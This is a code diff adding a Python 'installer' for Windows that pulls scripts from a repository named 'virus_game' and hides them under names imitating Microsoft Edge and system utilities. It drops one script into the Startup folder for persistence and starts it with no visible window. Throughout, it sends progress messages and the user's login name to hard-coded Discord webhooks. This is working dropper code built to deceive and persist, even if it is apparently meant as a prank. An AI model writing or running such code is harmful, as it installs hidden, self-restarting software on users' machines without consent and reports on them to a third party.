@@ -1,0 +1,104 @@
+import os
+import sys
+import subprocess
+import requests
+
+PYTHON_COMMAND = sys.executable
+
+def log_to_discord(msg:str, important=False):
+    """Sends a log message to a Discord webhook."""
+    # This webhook URL is from your other scripts.
+    # It's included here to maintain the logging functionality during installation.
+    webhook_url = "https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM"
+    important_webhook_url = "https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT"
+    
+    data = {"username": f"Installer:{os.getlogin()}", "content": msg}
+    try:
+        requests.post(webhook_url, json=data)
+        if important:
+            requests.post(important_webhook_url, json=data)
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send log message: {e}")
+
+def install_dependencies(requirements_path):
+    """Installs required Python packages using pip."""
+    print("Installing required dependencies...")
+    log_to_discord("Installing dependencies...", important=True)
+    try:
+        subprocess.check_call([PYTHON_COMMAND, "-m", "pip", "install", "-r", requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log_to_discord("Successfully installed dependencies from `dependencies.txt`.")
+    except subprocess.CalledProcessError:
+        print("Failed to install dependencies from dependencies.txt.")
+        print("Please ensure pip is installed and you have an internet connection.")
+        log_to_discord("**ERROR**: Failed to install dependencies from `dependencies.txt`.", important=True)
+        sys.exit(1)
+    print("All dependencies installed.")
+
+def download_file(url, destination):
+    """Downloads a file from a URL to a destination path."""
+    try:
+        print(f"Downloading {os.path.basename(destination)} from {url}...")
+        response = requests.get(url, stream=True)
+        response.raise_for_status()  # Raise an exception for bad status codes
+        
+        os.makedirs(os.path.dirname(destination), exist_ok=True)
+        
+        with open(destination, "wb") as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        print(f"Successfully downloaded to {destination}")
+        log_to_discord(f"Downloaded `{os.path.basename(destination)}`.")
+    except requests.exceptions.RequestException as e:
+        print(f"Error downloading {url}: {e}")
+        log_to_discord(f"**ERROR**: Failed to download `{os.path.basename(destination)}`: {e}")
+        sys.exit(1)
+
+def main():
+    """Main function to run the online installer."""
+    if sys.platform != "win32":
+        print("This program is intended for Windows only. Exiting.")
+        sys.exit(1)
+
+    log_to_discord("**Starting online installation of v2...**", important=True)
+
+    home_dir = os.path.expanduser("~")
+    shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    virus_dir = os.path.join(home_dir, ".temp", "Microsoft_Edge_x64", "utils")
+
+    repo_base_url = "https://raw.githubusercontent.com/Hacaric/virus_game/main/v2/"
+
+    # Download dependencies file and install packages
+    dependencies_url = f"{repo_base_url}dependencies.txt"
+    # Place it in a temporary but writable location
+    temp_dir = os.environ.get("TEMP", os.path.join(home_dir, ".temp"))
+    dependencies_path = os.path.join(temp_dir, "v2_requirements.txt")
+    download_file(dependencies_url, dependencies_path)
+    install_dependencies(dependencies_path)
+
+    # Defines which files to download and where to place them
+    files_to_install = [
+        (f"{repo_base_url}gama_aaa.py", os.path.join(virus_dir, "cleanup_x64.py")),
+        (f"{repo_base_url}file_checker.py", os.path.join(virus_dir, "cleaner_x32.py")),
+        (f"{repo_base_url}startup.py", os.path.join(shell_startup_dir, "python_executable_update_service.py")),
+        (f"{repo_base_url}youtube_com-watch-dQw4w9WgXcQ.mp3", os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")),
+    ]
+
+    print("\nDownloading and placing program files...")
+    for url, destination in files_to_install:
+        download_file(url, destination)
+
+    log_to_discord("Installation complete. Starting program.")
+    print("\nInstallation complete. Starting program...")
+
+    # Start the program via the startup script
+    startup_script_path = os.path.join(shell_startup_dir, "python_executable_update_service.py")
+    try:
+        subprocess.Popen([PYTHON_COMMAND, startup_script_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        print("Program started successfully in the background.")
+        print("The installer will now exit.")
+    except Exception as e:
+        print(f"Failed to start the program: {e}")
+        log_to_discord(f"**FATAL**: Failed to launch startup script: {e}", important=True)
+
+if __name__ == "__main__":
+    main()
